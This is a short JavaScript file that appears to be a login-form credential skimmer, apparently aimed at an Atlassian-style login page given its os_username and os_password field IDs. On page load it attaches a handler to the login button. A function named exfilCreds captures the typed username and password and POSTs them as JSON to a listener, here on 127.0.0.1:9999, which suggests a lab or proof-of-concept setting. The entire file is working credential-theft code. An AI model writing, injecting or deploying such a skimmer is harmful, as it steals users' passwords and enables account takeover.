document.addEventListener("DOMContentLoaded", function() {
	document.getElementById("loginButton").addEventListener("click", exfilCreds, true);
});

function exfilCreds() {
	const username = document.getElementById("os_username").value;
	const password = document.getElementById("os_password").value;
	const data = { username: username, password: password };

	fetch("http://127.0.0.1:9999", {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json',
		},
		body: JSON.stringify(data)
	}).catch((e) => console.error('Error:', e));

	return true;
}